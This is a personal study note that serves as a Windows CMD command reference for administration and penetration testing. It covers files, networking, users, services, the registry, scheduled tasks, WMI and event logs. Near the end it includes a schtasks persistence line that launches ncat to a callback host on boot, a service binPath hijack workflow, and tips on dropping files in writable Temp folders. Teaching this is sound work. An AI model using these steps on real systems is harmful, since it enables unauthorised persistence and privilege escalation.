Tags: #Status/In-Progress #Type/Knowledge #Context/Windows #publish-me

---
## Overview
Windows Command Line (CMD) provides core commands and utilities for interacting with the Windows OS, managing processes, retrieving system information, and performing network diagnostics. These commands are essential for administration, troubleshooting, and security investigation on Windows systems — and form the foundation for understanding the Windows environment before moving to PowerShell.

---

## Terminology
| Term | Definition |
|------|------------|
| CMD | Windows Command Prompt; built-in command-line interpreter |
| PID (Process ID) | Unique number assigned to each running process |
| Environment Variable | System-wide variable storing configuration values (e.g., PATH) |
| DLL (Dynamic Link Library) | Shared library files loaded by processes at runtime |
| Netstat | Utility displaying active network connections and listening ports |
| Flag | Optional modifier appended to a command to change its behavior |
| DACL | Discretionary Access Control List; defines who can access an object and at what level |
| SACL | System Access Control List; logs access attempts to objects |
| ACE | Access Control Entry; individual rule within an ACL |
| SID | Security Identifier; unique ID assigned to user/group accounts |
| SDDL | Security Descriptor Definition Language; string format representing a security descriptor |

---
## Core Concepts

### Accessing CMD
- `Win + R` → type `cmd` → Enter
- Path: `C:\Windows\System32\cmd.exe`
- Search "Command Prompt" in Start Menu
- Use `command /?` on any command to display help and available flags

### Getting Help & History
| Command | Description |
|---------|-------------|
| `help` | List all built-in CMD commands with brief descriptions |
| `help <command>` | Detailed help for a specific command |
| `<command> /?` | Alternative help flag used by some commands |
| `cls` | Clear the screen |
| `doskey /history` | Show all commands run in the current session |
| `F3` | Retype the entire previous command |
| `F5` | Cycle backward through command history |
| `F7` | Interactive scrollable history list |
| `F9` | Enter a command by its history number |
| `CTRL + C` | Interrupt and stop a running process |

Offline reference: https://ss64.com/nt/ — covers CMD, PowerShell, and Bash flags comprehensively.

### System Information
| Command | Description |
|---------|-------------|
| `ver` | Displays current Windows version |
| `systeminfo` | Detailed OS and hardware information |
| `driverquery` | Lists all installed drivers |
| `set` | Displays environment variables including PATH |

### File System Navigation & Management
| Command | Description |
|---------|-------------|
| `dir` | Lists files and directories in current location |
| `dir /a` | Shows hidden and system files |
| `dir /s` | Recursive listing of all files and subdirectories |
| `dir /A:R *` | Find files with a specific attribute (R = read-only; H = hidden) |
| `cd <path>` | Change directory; without arguments prints the current path |
| `tree` | Visualizes directory structure hierarchically |
| `tree /F` | Visualizes directory tree including all files |
| `type <filename>` | Displays contents of a text file |
| `more <filename>` | Displays file contents one screen at a time; press Space to advance |
| `more /S <filename>` | Same as above but compresses consecutive blank lines |
| `copy <source> <dest>` | Copies a file to destination |
| `move <source> <dest>` | Moves a file to destination |
| `del <filename>` | Deletes a file |
| `erase <filename>` | Identical to `del`; alternative alias |
| `del /A:R <filename>` | Delete read-only files; `/A:H` targets hidden files |

Pentest note: `C:\Windows\Temp` is world-writable (all users have read/write/execute) — useful for dropping files as a low-privilege user. `C:\Users\<user>\AppData\Local\Temp` is fully owned by the target user account — useful when operating as that user.

#### Creating and Renaming Files
| Command | Description |
|---------|-------------|
| `md <name>` | Create a new directory (alias: `mkdir`) |
| `rd <name>` | Remove an empty directory (alias: `rmdir`) |
| `rd /S <name>` | Remove a directory and all contents recursively |
| `ren <old> <new>` | Rename a file or directory (alias: `rename`) |
| `echo <text> > <file>` | Write text to a file (overwrites existing) |
| `echo <text> >> <file>` | Append text to a file |
| `fsutil file createNew <file> <bytes>` | Create a file of a specific size in bytes |

#### Copying and Moving Files
| Command | Description |
|---------|-------------|
| `xcopy <src> <dest>` | Extended copy; handles directories and can strip read-only attributes |
| `xcopy /E <src> <dest>` | Copy all subdirectories including empty ones; resets file attributes |
| `xcopy /K <src> <dest>` | Retain original file attributes (read-only, hidden) during copy |
| `robocopy <src> <dest>` | Successor to xcopy; designed for large directories and network drive sync |
| `robocopy /E <src> <dest>` | Copy all subdirectories including empty ones |
| `robocopy /MIR <src> <dest>` | Mirror source to destination; removes destination files not in source |
| `robocopy /A-:SH <src> <dest>` | Remove System and Hidden attributes from copied files |
| `robocopy /L <src> <dest>` | Dry run — show what would happen without executing |

Note: robocopy with `/MIR` marks files as system backup — use `/A-:SH` to strip those attributes afterward if needed. Requires `SeBackupPrivilege` for some system files.

#### File Redirection Operators
| Operator | Description |
|----------|-------------|
| `>` | Redirect output to a file (overwrites) |
| `>>` | Append output to a file |
| `\|` | Pipe output of one command as input to another |
| `<` | Use a file's contents as input to a command |
| `&` | Run two commands regardless of whether the first succeeds |
| `&&` | Run the second command only if the first succeeds |
| `\|\|` | Run the second command only if the first fails |

#### Finding Files and Text
| Command | Description |
|---------|-------------|
| `where <name>` | Search PATH environment variable for an executable or file |
| `where /R <path> <name>` | Recursively search from a starting path |
| `find "text" <file>` | Search for a literal text string inside a file |
| `find /V "text" <file>` | Find lines that do NOT contain the text |
| `find /N "text" <file>` | Show matching lines with line numbers |
| `find /I "text" <file>` | Case-insensitive search |
| `findstr <pattern> <file>` | Regex-based search — closer to `grep`; supports multiple patterns |
| `comp <file1> <file2>` | Compare two files byte-by-byte (default: decimal format) |
| `comp /A <file1> <file2>` | Compare in ASCII format |
| `fc <file1> <file2>` | Show which lines differ between two files (more readable than comp) |
| `fc /N <file1> <file2>` | File compare with line numbers shown |
| `sort <file>` | Sort lines of a file; can receive input from pipe |
| `sort /O <out> <file>` | Write sorted results to a different file |
| `sort /unique <file>` | Output only unique lines |
| `openfiles` | Show files currently open on the local or remote host and which user has them open; requires admin and must be enabled first with `openfiles /local on` |

### Environment Variables
Environment variables store configuration values accessible to the OS and applications. On Windows they are case-insensitive and can contain spaces and numbers, but cannot start with a number or contain an equals sign. Reference a variable with `%VARIABLE_NAME%`.

#### Variable Scopes
| Scope | Accessible By | Registry Location |
|-------|--------------|-------------------|
| System | All users and processes; requires Local/Domain Admin to modify | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` |
| User | Current user only | `HKCU\Environment` |
| Process | Current process only; volatile — lost when process ends | In memory only; inherits from System and User scopes |

#### Managing Environment Variables
| Command | Description |
|---------|-------------|
| `set` | Display all currently defined environment variables |
| `set %NAME%` | Show the value of a specific variable |
| `set NAME=Value` | Create or update a variable for the current CMD session only |
| `setx NAME Value` | Create or update a variable persistently (writes to registry; takes effect in new sessions) |
| `setx NAME ""` | Delete a variable by setting its value to empty |

`setx` can also target remote machines across a domain — useful for managing environment variables at scale.

#### Common Built-in Variables
| Variable | Expands To |
|----------|-----------|
| `%PATH%` | Directories searched when running an executable |
| `%OS%` | Current OS name (e.g., `Windows_NT`) |
| `%SYSTEMROOT%` | `C:\Windows` — Windows system directory |
| `%LOGONSERVER%` | Hostname of the authentication server for the current user |
| `%USERPROFILE%` | Current user's home directory (`C:\Users\<username>`) |
| `%ProgramFiles%` | `C:\Program Files` — 64-bit application install directory |
| `%ProgramFiles(x86)%` | `C:\Program Files (x86)` — 32-bit applications under WOW64 |
| `%APPDATA%` | User application data (`C:\Users\<user>\AppData\Roaming`) |
| `%TEMP%` | Current user's temporary files directory |

Full variable reference: https://ss64.com/nt/syntax-variables.html

---

### Network Diagnostics
| Command | Description |
|---------|-------------|
| `ipconfig` | Displays basic IP configuration |
| `ipconfig /all` | Full details including DNS, MAC address, and gateway |
| `ping <host>` | Tests connectivity to a host |
| `tracert <host>` | Shows route packets take to reach a host |
| `nslookup <domain>` | Queries DNS for a domain — see [[nslookup]] |
| `netstat` | Displays active connections and listening ports |
| `netstat -a` | All connections and listening ports |
| `netstat -b` | Shows executable associated with each connection |
| `netstat -o` | Shows PID associated with each connection |
| `netstat -n` | Displays addresses and ports numerically |
| `netstat -ano` | All connections with PIDs in numeric format — correlate to processes |
| `arp -a` | Displays ARP cache; reveals hosts on the local network segment |
| `route print` | Shows full routing table including default gateway |

### User & Privilege Enumeration
| Command | Description |
|---------|-------------|
| `whoami` | Current logged-on user |
| `whoami /priv` | List privileges assigned to current token; key for privilege escalation |
| `whoami /groups` | List all group memberships of current user |
| `whoami /all` | Full token dump — user, groups, and privileges combined |
| `net user` | List all local user accounts |
| `net user <username>` | Detailed info on a specific user — last logon, group memberships, password policy |
| `net localgroup` | List all local groups |
| `net localgroup administrators` | List members of the local administrators group |
| `net localgroup "<group>" <user> /add` | Add a user to a local group |

### Share & Network Resource Management
| Command | Description |
|---------|-------------|
| `net share` | List all active network shares on the system |
| `net use` | View or connect to network shares |
| `net use Z: \\<host>\<share>` | Map a network share to a drive letter |
| `net view \\<host>` | List shares on a remote host |

### File Permissions — icacls
`icacls` views and modifies NTFS permissions on files and folders.

| Command | Description |
|---------|-------------|
| `icacls <path>` | View permissions on a file or directory |
| `icacls <path> /grant <user>:(F)` | Grant Full Control to a user |
| `icacls <path> /grant <user>:(OI)(CI)(F)` | Grant Full Control including all subdirectories and files |
| `icacls <path> /remove <user>` | Remove all permissions for a user |
| `icacls <path> /reset` | Reset permissions to inherited defaults |

#### Inheritance Flags

| Flag | Meaning |
|------|---------|
| `(OI)` | Object Inherit — applies to files in this folder |
| `(CI)` | Container Inherit — applies to subfolders |
| `(IO)` | Inherit Only — does not apply to the folder itself |
| `(NP)` | No Propagate Inherit |
| `(I)` | Permission inherited from parent |

Reference: `icacls /?` or https://ss64.com/nt/icacls.html

### Process & Service Overview
| Command | Description |
|---------|-------------|
| `tasklist` | List all running processes with name and PID |
| `tasklist /svc` | Show which services are running under each process |
| `tasklist /FI "imagename eq sshd.exe"` | Filter running processes by image name |
| `tasklist /m /FI "PID eq 1304"` | Show all DLLs loaded by a specific process (useful for DLL hijacking checks) |
| `taskkill /PID <target>` | Kill a process by its PID |
| `net start` | List all running services |
| `net start <service>` | Start a named service |
| `net stop <service>` | Stop a named service |
| `net pause <service>` | Pause a service |
| `net continue <service>` | Resume a paused service |

### Service Management — sc
`sc` (Service Control) queries and modifies Windows services.

| Command | Description |
|---------|-------------|
| `sc query` | List all running services |
| `sc query type= all` | List all services (including stopped) |
| `sc qc <service>` | Query full configuration of a service (binary path, start type, account) |
| `sc \\<host> query <service>` | Query a service on a remote host |
| `sc start <service>` | Start a service |
| `sc stop <service>` | Stop a service |
| `sc config <service> binPath= "<path>"` | Change the binary path of a service |
| `sc sdshow <service>` | Show the service security descriptor in SDDL format |

Reading SDDL output from `sc sdshow`:
- `D:` — DACL entries follow
- `(A;;CCLCSWRPLORC;;;AU)` — `A` = allow; `AU` = Authenticated Users; codes are permission flags
- Common DACL flags: `CC` = query config, `LC` = query status, `SW` = enumerate dependents, `RP` = start service, `LO` = interrogate, `RC` = read control

### Registry — reg
| Command | Description |
|---------|-------------|
| `reg query <key>` | List values and subkeys at a registry path |
| `reg query <key> /v <value>` | Query a specific value |
| `reg query <key> /s` | Recursively query all subkeys |
| `reg add <key> /v <value> /t REG_SZ /d <data>` | Add or modify a registry value |
| `reg delete <key> /v <value>` | Delete a specific registry value |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | View programs set to run at startup (HKLM) |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | View programs set to run at startup (HKCU) |

### Scheduled Tasks — schtasks
| Command                                                          | Description                                       |
| ---------------------------------------------------------------- | ------------------------------------------------- |
| `schtasks /query /fo LIST /v`                                    | List all scheduled tasks with full verbose detail |
| `schtasks /query /fo TABLE`                                      | List tasks in compact table format                |
| `schtasks /create /sc onlogon /tn "<name>" /tr "<command>"`      | Create a task that runs at logon                  |
| `schtasks /create /sc minute /mo 1 /tn "<name>" /tr "<command>"` | Create a task that runs every minute              |
| `schtasks /delete /tn "<name>" /f`                               | Delete a scheduled task                           |
| `schtasks /run /tn "<name>"`                                     | Manually trigger a scheduled task immediately     |
| `schtasks /change /tn "<name>" /tr "<newcmd>"`                   | Change the command a task runs                    |
| `schtasks /change /tn "<name>" /ru <user> /rp <password>`        | Change the user credentials a task runs under     |
| `schtasks /change /tn "<name>" /ENABLE`                          | Enable a disabled task                            |
| `schtasks /change /tn "<name>" /DISABLE`                         | Disable an active task                            |

Additional create flags:
| Flag | Description |
|------|-------------|
| `/rl LIMITED` | Run with limited (standard user) privileges — default |
| `/rl HIGHEST` | Run with highest available privileges |
| `/z` | Delete the task automatically after it completes once |
| `/mo <n>` | Modifier for schedule frequency (e.g., every n minutes) |
| `/s <host>` | Target a remote host; requires `/u` and `/p` for credentials |

Persistence example — create a task that phones home to a C2 on every reboot:
`schtasks /create /sc ONSTART /tn "UpdateTask" /tr "C:\Users\user\AppData\Local\ncat.exe 10.10.10.1 4444"`

### WMI — wmic
`wmic` provides a command-line interface to Windows Management Instrumentation.

| Command | Description |
|---------|-------------|
| `wmic os list brief` | OS version, build, and system name |
| `wmic computersystem get name,username` | Hostname and currently logged-on user |
| `wmic useraccount get name,sid` | List all local user accounts with their SIDs |
| `wmic service list brief` | All services with name, PID, state, and start mode |
| `wmic process list brief` | All running processes (name, PID, parent PID, handles) |
| `wmic process where name="<proc>.exe" delete` | Kill a process by name |
| `wmic startup list brief` | Programs configured to run at startup |
| `wmic product get name,version` | List all installed software |
| `wmic bios get serialnumber,version` | BIOS serial number and version |
| `wmic logicaldisk get name,size,freespace` | Drive space on all logical disks |
| `wmic nic get name,macaddress` | Network adapters and MAC addresses |

### Windows Event Log
Windows logs system activity into structured event records. SOC analysts use these to detect attacks; pentesters review them to find information and cover tracks.

#### Log Categories
| Log | Purpose |
|-----|---------|
| System | Events from Windows OS components (driver failures, service crashes) |
| Security | Login successes/failures, file access, audit events |
| Application | Events from installed software |
| Setup | Events generated during Windows installation; AD events on domain controllers |
| Forwarded Events | Logs collected and forwarded from other hosts |

#### Event Types
| Type | Description |
|------|-------------|
| Error | Major problem (e.g., a service failed to load) |
| Warning | Potential issue that may need attention (e.g., low disk space) |
| Information | Normal successful operation |
| Success Audit | A security-audited action succeeded |
| Failure Audit | A security-audited action was denied |

#### Severity Levels
| Level | Value | Meaning |
|-------|-------|---------|
| Verbose | 5 | Progress or success messages |
| Information | 4 | Normal operational event |
| Warning | 3 | Potential problem worth investigating |
| Error | 2 | Non-critical issue related to a service or component |
| Critical | 1 | Significant failure requiring immediate attention |

Default log storage: `C:\Windows\System32\winevt\logs`

#### wevtutil — Command-Line Event Log Tool
`wevtutil` queries, exports, and manages Windows event logs from CMD.

| Command | Description |
|---------|-------------|
| `wevtutil el` | List all available log names on the system |
| `wevtutil gl "Windows PowerShell"` | Get configuration details for a specific log (max size, retention) |
| `wevtutil gli "Windows PowerShell"` | Get current log status (number of events, last write time) |
| `wevtutil qe Security /c:5 /rd:true /f:text` | Query the 5 most recent Security log events in readable text format |
| `wevtutil epl System C:\system_export.evtx` | Export all events from the System log to a file; requires local admin |

Filter by event ID for targeted investigation — see [[Log Fundamentals]] for key event IDs to monitor.

References: https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it

---

### GUI Access
| Command | Description |
|---------|-------------|
| `control /name Microsoft.WindowsUpdate` | Opens Windows Update panel |

### Quick Reference Workflows

#### System Recon
`systeminfo` — grab OS version, hostname, patch level, and hardware info in one command

#### Network Troubleshooting
`ipconfig /all` → verify IP, DNS, gateway
`ping <host>` → test basic connectivity
`tracert <host>` → identify where packets are being dropped

#### Process Investigation
`tasklist /FI "imagename eq <process>"` → find a specific process
`netstat -ano` → correlate open connections with PIDs
`tasklist /m /FI "PID eq <PID>"` → see what DLLs a suspicious process has loaded

#### Privilege Escalation Recon
`whoami /all` → dump current user token (user, groups, privileges)
`net localgroup administrators` → who has local admin?
`wmic service list brief` → any misconfigured services?
`schtasks /query /fo LIST /v` → any writable scheduled task paths?
`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` → startup persistence

#### Service Abuse (Misconfigured Binary Path)
`sc qc <service>` → find binary path and start type
`icacls "<binary path>"` → check if your user can write to the binary
`sc config <service> binPath= "<malicious path>"` → replace binary (if writable)
`sc stop <service> && sc start <service>` → restart to trigger execution

---
## Related Concepts
- [[Windows Fundamentals]]
- [[Windows PowerShell]]
- [[Windows Event Logs]]
- [[Active Directory Basics]]
- [[Log Fundamentals]]

## Related Techniques
- [[Windows Pentest Playbook]]

## Related Tools
- [[nslookup]]

---
## References / Images
- https://ss64.com/nt/ — CMD, PowerShell, and Bash command reference
- https://ss64.com/nt/icacls.html
- https://ss64.com/nt/syntax-variables.html — Full list of Windows environment variables
- https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic
- https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor — Recommended event IDs to monitor
- https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/ — Full Windows event ID encyclopedia
